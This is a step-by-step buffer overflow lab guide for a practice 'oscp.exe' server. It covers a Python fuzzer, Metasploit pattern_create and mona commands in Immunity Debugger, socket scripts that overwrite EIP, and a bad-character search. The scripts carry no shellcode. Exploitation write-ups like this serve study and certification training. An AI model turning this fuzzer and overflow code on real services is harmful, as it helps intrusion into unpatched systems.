


---

### Mona Configuration

- The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    - `!mona config -set workingfolder c:\mona\%p`

---

### 1. Fuzzing

- The fuzzer will send increasingly long strings comprised of `A`. 
    
- If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. 
    
- Make a note of the largest number of bytes that were sent.

    - `overflow1_step1_fuzzing.py` (chmod +x)

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.56.134"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

- `python3_fuzzer.py`

---

### 2. Crash Replication & Controlling EIP

- Run the following command to generate a cyclic pattern of a length `400 bytes` longer ([Ax100,Ax100]:200+400) that the string that crashed the server (change the -l value to this):

    - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600` 

- Copy the output and place it into the payload variable of the `overflow1_step2_exploit.py` script. 

- Create:

    - `overflow1_step2_exploit.py` (chmod +x)

        - **Empty version:**

```python
import socket

ip = "10.10.56.134"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

- The script should crash the `oscp.exe` server again. 

- This time, in `Immunity Debugger`, in the **command input box at the bottom of the screen**, run the following **mona command**, changing the distance to the same length as the pattern you created:

    - `!mona findmsp -distance 600`
    
- Mona should display a log window with the output of the command. 

    - If not, click the `Window` menu and then `Log data` to view it (choose "CPU" to switch back to the standard view).

- In this output you should see a line which states:

    - `EIP contains normal pattern : ... (offset XXXX)` 
    
1. Update your `overflow1_step2_exploit.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**. 

2. Set the `payload` variable to an **empty string again**. 

3. Set the `retn` variable to `BBBB`.

4. Restart `oscp.exe` in `Immunity Debugger` and run the modified `overflow1_step2_exploit.py` script again. 

    - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 

- Create:

    - `overflow1_step2_exploit.py` (chmod +x)

        - **Exploit Script Ready:**

```python
import socket

ip = "10.10.56.134"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

---  

### 3. Finding Bad Characters

- Generate a `bytearray` using `mona`, and **exclude the null byte `\x00` by default.** 

- Note the location of the `bytearray.bin` file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be `C:\mona\oscp\bytearray.bin`).

    - `!mona bytearray -b "\x00"`

- Now generate a **string of bad chars** that is **identical to the bytearray**. 

    - The following python script can be used to **generate a string of bad chars from \x01 to \xff**:

```python
# Byte Array (badchars) creator

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

- Update your `overflow1_step2_exploit.py` script and set the `payload` variable **to the string of bad chars the script generates.**

    - I will call this script `overflow1_step3_findBadchars.py`

- Create:

    - `overflow1_step3_findBadchars.py` (chmod +x)

        - **Exploit Script Ready:**

```python
import socket

ip = "10.10.56.134"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "necesito poner algo aqui weyyyyyyyyyyyyy"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```    

- Restart `oscp.exe` in `Immunity Debugger` and run the `overflow1_step3_findBadchars.py` script**. 

    - **Make a note of the address to which the `ESP` register points and use it in the following `mona` command:**
    
        - `!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

- A popup window should appear labelled "mona Memory comparison results". _If not, use the Window menu to switch to it._

    - **The window shows the results of the comparison**, indicating any characters that are different in memory to what they are in the generated `bytearray.bin` file.

    - **IMPORTANT: Not all of these might be `badchars`! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string. (Just like the example in the vuln server lab)**
    
        - Example (I took this example from another Lab with a very obvious badchar `B0`): 
        
            - ![image](https://user-images.githubusercontent.com/94720207/169384923-46ad25d7-56bb-4323-ba5d-05576cdae939.png)

                - Right away in the first line we saw a "weird" sequence: **1,2,3... `B0`, `B0` ...6, 7, 8**
        
                - This means `B0` is a `bad char`, we need to note all `B0`s including the missing numbers that this miss-sequence originates.
                
                    - **In this example the badchars would be `"\x00\xB0"`** 

- **Find Badchars:**
    
    1. The first badchar in the list should be the null byte `\x00` since we already removed it from the file. 
    
    2. Make a note of any others. 
    
    3. Generate a new `bytearray` in `mona`, specifying these new `badchars` along with `\x00`. 
    
    4. Then update the `payload` variable in your `overflow1_step3_findBadchars.py` script and remove the **new badchars** as well.

    5. Restart `oscp.exe` in `Immunity Debugger` and run the `overflow1_step3_findBadchars.py` script again. 
    
    6. **Repeat the badchar comparison until the results status returns `Unmodified`. This indicates that no more badchars exist.** 
        
        

---

### References

- https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
